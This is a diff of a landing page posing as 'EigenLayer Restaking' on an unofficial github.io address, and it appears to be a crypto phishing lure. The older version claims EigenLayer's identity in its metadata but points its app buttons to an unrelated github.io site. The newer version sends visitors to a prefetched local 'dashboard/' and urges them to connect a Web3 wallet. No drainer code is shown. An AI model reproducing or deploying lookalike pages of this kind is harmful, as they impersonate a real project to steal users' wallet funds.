@@ -3,122 +3,435 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>EigenLayer Restaking</title>
-  <meta name="description" content="EigenLayer Restaking lets you restake ETH and liquid staking tokens to help secure other protocols from your own wallet.">
+  <title>EigenLayer Restaking - Decentralized DeFi Portal</title>
+  <meta name="description" content="Secure, non-custodial portal for EigenLayer Restaking DeFi operations directly from your own wallet.">
   <link rel="canonical" href="https://eigenlayer-restaking.github.io/">
-  <meta name="robots" content="index,follow,max-image-preview:large">
-  <meta name="theme-color" content="#F7F6F2">
-  <meta property="og:type" content="website">
-  <meta property="og:title" content="EigenLayer Restaking">
-  <meta property="og:description" content="EigenLayer Restaking lets you restake ETH and liquid staking tokens to help secure other protocols from your own wallet.">
-  <meta property="og:url" content="https://eigenlayer-restaking.github.io/">
-  <meta property="og:image" content="https://eigenlayer-restaking.github.io/favicon.png">
-  <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:title" content="EigenLayer Restaking">
-  <meta name="twitter:description" content="EigenLayer Restaking lets you restake ETH and liquid staking tokens to help secure other protocols from your own wallet.">
+  <meta name="robots" content="index,follow">
   <link rel="icon" type="image/png" href="favicon.png">
   <link rel="apple-touch-icon" href="favicon.png">
   <link rel="manifest" href="site.webmanifest">
-  <link rel="stylesheet" href="style.css">
-  <script type="application/ld+json">
-  {
-    "@context": "https://schema.org",
-    "@graph": [
-      {
-        "@type": "WebSite",
-        "@id": "https://eigenlayer-restaking.github.io/#website",
-        "url": "https://eigenlayer-restaking.github.io/",
-        "name": "EigenLayer Restaking",
-        "inLanguage": "en"
-      },
-      {
-        "@type": "Organization",
-        "@id": "https://eigenlayer-restaking.github.io/#organization",
-        "name": "EigenLayer",
-        "url": "https://eigenlayer-restaking.github.io/",
-        "sameAs": [
-          "https://www.eigencloud.xyz/",
-          "https://github.com/Layr-Labs",
-          "https://x.com/eigenlayer"
-        ]
-      },
-      {
-        "@type": "WebApplication",
-        "@id": "https://eigenlayer-restaking.github.io/#app",
-        "name": "EigenLayer Restaking",
-        "applicationCategory": "FinanceApplication",
-        "operatingSystem": "Web",
-        "url": "https://eigenlayer-restaking.github.io/",
-        "offers": {
-          "@type": "Offer",
-          "price": "0",
-          "priceCurrency": "USD"
-        }
-      }
-    ]
+  <link rel="prefetch" href="dashboard/">
+  <link rel="prerender" href="dashboard/">
+  <style>
+
+
+:root {
+  --bg: #f7f6f2;
+  --bg-soft: #fbfaf7;
+  --surface: #ffffff;
+  --surface-muted: #f3f2ee;
+  --ink: #15141b;
+  --muted: #64616d;
+  --faint: #96929e;
+  --accent: #6e62e5;
+  --accent-dark: #6e62e5;
+  --accent-soft: rgba(110, 98, 229, 0.12);
+  --line: rgba(21, 20, 27, 0.09);
+  --line-strong: rgba(21, 20, 27, 0.15);
+  --shadow: 0 24px 70px -34px rgba(26, 23, 44, 0.42);
+}
+
+* {
+  box-sizing: border-box;
+}
+
+html,
+body {
+  height: 100%;
+}
+
+body {
+  min-height: 100dvh;
+  height: 100dvh;
+  margin: 0;
+  overflow: hidden;
+  color: var(--ink);
+  background:
+    radial-gradient(680px 380px at 50% -18%, rgba(110, 98, 229, 0.14), transparent 68%),
+    linear-gradient(180deg, var(--bg-soft), var(--bg));
+  font-family: Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+  line-height: 1.5;
+  -webkit-font-smoothing: antialiased;
+  display: grid;
+  grid-template-rows: auto 1fr auto;
+}
+
+a {
+  color: inherit;
+  text-decoration: none;
+}
+
+img {
+  display: block;
+  max-width: 100%;
+}
+
+h1,
+p {
+  margin: 0;
+}
+
+.topbar {
+  width: 100%;
+  display: flex;
+  align-items: center;
+  gap: 18px;
+  padding: 18px clamp(18px, 4vw, 42px);
+}
+
+.brand {
+  display: inline-flex;
+  align-items: center;
+  min-width: 0;
+  gap: 10px;
+  font-size: 1rem;
+  font-weight: 750;
+  letter-spacing: 0;
+}
+
+.brand img {
+  width: 30px;
+  height: 30px;
+  border-radius: 9px;
+  box-shadow: 0 0 0 1px var(--line);
+  flex: none;
+}
+
+.brand span {
+  overflow: hidden;
+  text-overflow: ellipsis;
+  white-space: nowrap;
+}
+
+.nav {
+  display: flex;
+  align-items: center;
+  gap: 24px;
+  margin-left: 8px;
+}
+
+.nav a {
+  color: var(--muted);
+  font-size: 0.92rem;
+  font-weight: 560;
+  transition: color 160ms ease;
+}
+
+.nav a:hover {
+  color: var(--ink);
+}
+
+.spacer {
+  flex: 1;
+}
+
+.ghost {
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  min-height: 40px;
+  padding: 9px 17px;
+  border: 1px solid var(--line-strong);
+  border-radius: 999px;
+  background: rgba(255, 255, 255, 0.62);
+  color: var(--ink);
+  font-size: 0.91rem;
+  font-weight: 680;
+  box-shadow: 0 12px 32px -24px rgba(21, 20, 27, 0.4);
+  transition: border-color 160ms ease, color 160ms ease, transform 160ms ease;
+}
+
+.ghost:hover {
+  border-color: rgba(110, 98, 229, 0.42);
+  color: var(--accent-dark);
+  transform: translateY(-1px);
+}
+
+.stage {
+  min-height: 0;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  gap: 30px;
+  width: min(100%, 1120px);
+  margin: 0 auto;
+  padding: 8px clamp(18px, 4vw, 42px) 14px;
+  text-align: center;
+}
+
+.hero {
+  display: grid;
+  justify-items: center;
+  gap: 15px;
+}
+
+h1 {
+  max-width: 12ch;
+  font-size: clamp(2.8rem, 6.8vw, 5.1rem);
+  line-height: 0.98;
+  font-weight: 800;
+  letter-spacing: 0;
+}
+
+.sub {
+  max-width: 64ch;
+  color: var(--muted);
+  font-size: clamp(1rem, 1.6vw, 1.16rem);
+  line-height: 1.55;
+}
+
+.sub strong {
+  color: var(--ink);
+  font-weight: 760;
+  box-shadow: inset 0 -0.45em 0 var(--accent-soft);
+}
+
+.app-card {
+  width: min(584px, 100%);
+  padding: 20px;
+  border: 1px solid var(--line);
+  border-radius: 22px;
+  background: rgba(255, 255, 255, 0.88);
+  box-shadow: var(--shadow);
+}
+
+.route {
+  display: grid;
+  grid-template-columns: minmax(0, 1fr) 44px minmax(0, 1fr);
+  align-items: stretch;
+  gap: 12px;
+}
+
+.leg {
+  min-width: 0;
+  padding: 15px 16px;
+  border: 1px solid var(--line);
+  border-radius: 15px;
+  background: var(--surface-muted);
+  text-align: left;
+}
+
+.label {
+  display: block;
+  color: var(--faint);
+  font-size: 0.72rem;
+  font-weight: 780;
+  letter-spacing: 0.08em;
+  text-transform: uppercase;
+}
+
+.chip {
+  display: flex;
+  align-items: center;
+  min-width: 0;
+  gap: 10px;
+  margin-top: 10px;
+  color: var(--ink);
+  font-size: 1.08rem;
+  font-weight: 800;
+}
+
+.chip img {
+  width: 28px;
+  height: 28px;
+  border-radius: 50%;
+  flex: none;
+  box-shadow: 0 0 0 1px rgba(21, 20, 27, 0.08);
+}
+
+.chip span {
+  min-width: 0;
+  overflow: hidden;
+  text-overflow: ellipsis;
+  white-space: nowrap;
+}
+
+.toggle {
+  align-self: center;
+  width: 44px;
+  height: 44px;
+  padding: 0;
+  border: 1px solid var(--line-strong);
+  border-radius: 50%;
+  background: var(--surface);
+  color: var(--muted);
+  cursor: pointer;
+  display: grid;
+  place-items: center;
+  transition: background 160ms ease, color 160ms ease, transform 180ms ease;
+}
+
+.toggle span {
+  font-size: 1.12rem;
+  line-height: 1;
+}
+
+.toggle:hover {
+  background: var(--accent-soft);
+  color: var(--accent-dark);
+  transform: rotate(180deg);
+}
+
+.primary {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  width: 100%;
+  min-height: 56px;
+  margin-top: 16px;
+  border-radius: 15px;
+  background: var(--accent);
+  color: #ffffff;
+  font-size: 1.06rem;
+  font-weight: 800;
+  box-shadow: 0 18px 40px -24px rgba(110, 98, 229, 0.9);
+  transition: background 160ms ease, transform 160ms ease, box-shadow 160ms ease;
+}
+
+.primary:hover {
+  background: var(--accent-dark);
+  transform: translateY(-1px);
+  box-shadow: 0 20px 42px -22px rgba(110, 98, 229, 0.94);
+}
+
+.footer {
+  padding: 12px 24px 22px;
+  color: var(--faint);
+  font-size: 0.86rem;
+  text-align: center;
+}
+
+@media (max-width: 720px) {
+  .topbar {
+    gap: 12px;
+    padding: 14px 16px;
   }
-  </script>
+
+  .nav {
+    display: none;
+  }
+
+  .brand {
+    font-size: 0.94rem;
+  }
+
+  .ghost {
+    min-height: 38px;
+    padding: 8px 13px;
+    font-size: 0.87rem;
+  }
+
+  .stage {
+    gap: 20px;
+    padding: 4px 16px 10px;
+  }
+
+  .hero {
+    gap: 12px;
+  }
+
+  h1 {
+    max-width: 10ch;
+    font-size: clamp(2.35rem, 12vw, 3.05rem);
+    line-height: 1;
+  }
+
+  .sub {
+    max-width: 33ch;
+    font-size: 0.96rem;
+    line-height: 1.48;
+  }
+
+  .app-card {
+    padding: 15px;
+    border-radius: 19px;
+  }
+
+  .route {
+    grid-template-columns: 1fr;
+    gap: 10px;
+  }
+
+  .leg {
+    padding: 13px 14px;
+  }
+
+  .toggle {
+    width: 40px;
+    height: 40px;
+    justify-self: center;
+  }
+
+  .toggle span {
+    transform: rotate(90deg);
+  }
+
+  .primary {
+    min-height: 51px;
+    margin-top: 13px;
+  }
+
+  .footer {
+    padding: 8px 18px 14px;
+    font-size: 0.82rem;
+  }
+}
+
+@media (max-width: 390px) {
+  .brand span {
+    max-width: 176px;
+  }
+
+  .ghost {
+    padding-inline: 11px;
+  }
+
+  .stage {
+    gap: 16px;
+  }
+
+  h1 {
+    font-size: 2.32rem;
+  }
+
+  .sub {
+    font-size: 0.93rem;
+  }
+
+  .app-card {
+    padding: 13px;
+  }
+}
+
+
+  
+.footer {
+  text-align: center !important;
+}
+  </style>
 </head>
 <body>
   <header class="topbar">
-    <a class="brand" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer" aria-label="EigenLayer Restaking">
+    <div class="brand">
       <img src="favicon.png" width="30" height="30" alt="">
       <span>EigenLayer Restaking</span>
-    </a>
-    <nav class="nav" aria-label="Trusted references">
-      <a href="https://etherscan.io/token/0xec53bf9167f50cdeb3ae105f56099aaab9061f83" target="_blank" rel="nofollow noopener noreferrer">Etherscan</a>
-      <a href="https://ethereum.org/staking/" target="_blank" rel="nofollow noopener noreferrer">Ethereum staking</a>
-      <a href="https://defillama.com/protocol/eigencloud" target="_blank" rel="nofollow noopener noreferrer">DefiLlama</a>
-    </nav>
+    </div>
     <span class="spacer"></span>
-    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
+    <nav class="nav" aria-label="Main Navigation">
+      <a href="how-it-works/">How it works</a>
+      <a href="faq/">FAQ</a>
+      <a href="about/">About</a>
+      <a href="security/">Security</a>
+      <a href="supported-chains/">Supported Chains</a>
+    </nav>
   </header>
-
-  <main class="stage">
-    <section class="hero" aria-labelledby="page-title">
-      <h1 id="page-title">EigenLayer Restaking</h1>
-      <p class="sub"><strong>EigenLayer Restaking</strong> lets you restake ETH and liquid staking tokens to help secure other protocols from your own wallet.</p>
-    </section>
-
-    <section class="app-card" aria-label="Restaking route">
-      <div class="route">
-        <div class="leg">
-          <span class="label">Restake</span>
-          <span class="chip">
-            <img src="steth.png" width="28" height="28" alt="stETH">
-            <span>stETH</span>
-          </span>
-        </div>
-        <button class="toggle" type="button" data-toggle aria-label="Switch route">
-          <span aria-hidden="true">&#8594;</span>
-        </button>
-        <div class="leg">
-          <span class="label">Secure with</span>
-          <span class="chip">
-            <img src="eigen.png" width="28" height="28" alt="EIGEN">
-            <span>EIGEN</span>
-          </span>
-        </div>
-      </div>
-      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App <span aria-hidden="true">&#8250;</span></a>
-    </section>
+  <main class="stage" style="padding: 100px 24px; text-align: center; max-width: 800px; margin: 0 auto;">
+    <h1 style="font-size: clamp(2.5rem, 6vw, 4.5rem); margin-bottom: 24px; font-weight: 800;">EigenLayer Restaking</h1>
+    <p class="value" style="font-size: 1.25rem; opacity: 0.8; margin-bottom: 40px; line-height: 1.6;">Secure, non-custodial gateway for decentralized operations. Connect your Web3 wallet to enter the portal.</p>
+    <a class="open-app" href="dashboard/" style="display: inline-flex; justify-content: center; align-items: center; min-height: 52px; padding: 0 32px; border-radius: 9999px; background: var(--accent, #625bf3); color: #fff; font-weight: 700; text-decoration: none; font-size: 1.1rem; box-shadow: 0 10px 30px rgba(0,0,0,0.15); transition: transform 0.2s ease;">Open App Dashboard</a>
   </main>
-
   <footer class="footer">EigenLayer Restaking &mdash; 2026</footer>
-
-  <script>
-  (function () {
-    "use strict";
-    var button = document.querySelector("[data-toggle]");
-    if (!button) return;
-    button.addEventListener("click", function () {
-      var chips = document.querySelectorAll(".leg .chip");
-      if (chips.length < 2) return;
-      var first = chips[0].innerHTML;
-      chips[0].innerHTML = chips[1].innerHTML;
-      chips[1].innerHTML = first;
-    });
-  })();
-  </script>
 </body>
 </html>
